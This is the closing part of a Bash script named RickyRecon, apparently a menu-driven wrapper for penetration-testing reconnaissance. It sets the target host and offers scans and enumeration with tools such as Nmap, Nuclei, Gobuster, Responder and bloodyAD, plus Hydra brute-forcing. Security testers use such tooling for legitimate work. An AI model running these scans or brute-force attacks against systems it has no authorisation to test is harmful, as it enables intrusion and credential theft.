    echo -e "${BLUE}═══════════════════════════════════════════════${NC}"
    echo
    echo -e "${YELLOW}Current target: $HOSTONLY ($BASEURL)${NC}"
    echo
    read -rp "Enter new target host or URL (or press Enter to cancel): " WEBTARGET

    if [[ -z "$WEBTARGET" ]]; then
        echo -e "${YELLOW}[*] Keeping current target.${NC}"
        return
    fi

    WEBTARGET="${WEBTARGET//[[:space:]]/}"

    if [[ "$WEBTARGET" =~ ^https?:// ]]; then
        BASEURL="$WEBTARGET"
        HOSTONLY="${WEBTARGET#*://}"; HOSTONLY="${HOSTONLY%%/*}"
    else
        BASEURL="http://$WEBTARGET"
        HOSTONLY="$WEBTARGET"
    fi

    echo
    echo -e "${GREEN}[+] Target updated!${NC}"
    echo -e "${GREEN}[*] Target host: $HOSTONLY${NC}"
    echo -e "${GREEN}[*] Base URL:    $BASEURL${NC}"

    read -rp "Press Enter to continue..."
}

# ─────────────────────────────────────────────
# Main Menu
# ─────────────────────────────────────────────
main_menu() {
    while true; do
        show_banner
        echo -e "${PURPLE}═══════════════════════════════════════════════${NC}"
        echo -e "${PURPLE}              MAIN MENU${NC}"
        echo -e "${PURPLE}═══════════════════════════════════════════════${NC}"
        echo -e "${CYAN}Target: $HOSTONLY ($BASEURL)${NC}"
        echo -e "${CYAN}Output: $DIR/${NC}"
        echo
        echo -e "  ${BLUE}── TOOL CATEGORIES ──${NC}"
        echo -e "  ${GREEN}1)${NC}  Port Scanning     (RustScan, Nmap)"
        echo -e "  ${GREEN}2)${NC}  Web Scanning      (Nikto, Nuclei, WPScan, Wafw00f, etc.)"
        echo -e "  ${GREEN}3)${NC}  Directory Fuzzing (Dirb, Gobuster, FFuF, etc.)"
        echo -e "  ${GREEN}4)${NC}  DNS & OSINT       (Amass, Subfinder, theHarvester, etc.)"
        echo -e "  ${GREEN}5)${NC}  SMB Enumeration   (Enum4linux-ng, NetExec)"
        echo -e "  ${GREEN}6)${NC}  Active Directory  (LDAPSearch, Responder, bloodyAD)"
        echo -e "  ${GREEN}7)${NC}  Brute Force       (Hydra)"
        echo -e "  ${GREEN}8)${NC}  Utilities         (EyeWitness, SearchSploit)"
        echo
        echo -e "  ${BLUE}── QUICK ACTIONS ──${NC}"
        echo -e "  ${YELLOW}9)${NC}  Run ALL Tools (Full Recon)"
        echo -e "  ${YELLOW}10)${NC} Quick Scan (RustScan + WhatWeb + Gobuster)"
        echo -e "  ${YELLOW}11)${NC} RustScan          - Fast port scanner"
        echo -e "  ${YELLOW}12)${NC} Nuclei            - Vulnerability scanner"
        echo
        echo -e "  ${BLUE}── SETTINGS ──${NC}"
        echo -e "  ${CYAN}13)${NC} Change Target"
        echo -e "  ${CYAN}14)${NC} Check/Install Tools"
        echo -e "  ${CYAN}15)${NC} Configure Alt Ports  ${ALT_PORTS[*]:+(${ALT_PORTS[*]})}${ALT_PORTS[*]:-  (none configured)}"
        echo
        echo -e "  ${RED}Q)${NC}  Quit"
        echo
        read -rp "Select option: " choice

        case $choice in
            1) port_scan_menu ;;
            2) web_scan_menu ;;
            3) dir_fuzz_menu ;;
            4) dns_osint_menu ;;
            5) smb_enum_menu ;;
            6) ad_enum_menu ;;
            7) brute_force_menu ;;
            8) utils_menu ;;
            9)
                run_all_tools
                echo
                read -rp "Press Enter to continue..."
                ;;
            10)
                echo -e "${YELLOW}[*] Running Quick Scan...${NC}"
                run_rustscan
                run_whatweb
                run_gobuster
                echo -e "${GREEN}[+] Quick scan tools launched!${NC}"
                echo
                read -rp "Press Enter to continue..."
                ;;
            11)
                run_rustscan
                echo
                read -rp "Press Enter to continue..."
                ;;
            12)
                run_nuclei
                echo
                read -rp "Press Enter to continue..."
                ;;
            13) change_target_menu ;;
            14)
                install_if_missing
                echo
                read -rp "Press Enter to continue..."
                ;;
            15) manage_alt_ports ;;
            [Qq])
                echo -e "${GREEN}[*] Exiting RickyRecon. Happy hunting!${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                sleep 1
                ;;
        esac
    done
}

# ─────────────────────────────────────────────
# Entry Point
# ─────────────────────────────────────────────
main() {
    initial_setup
    main_menu
}

main "$@"
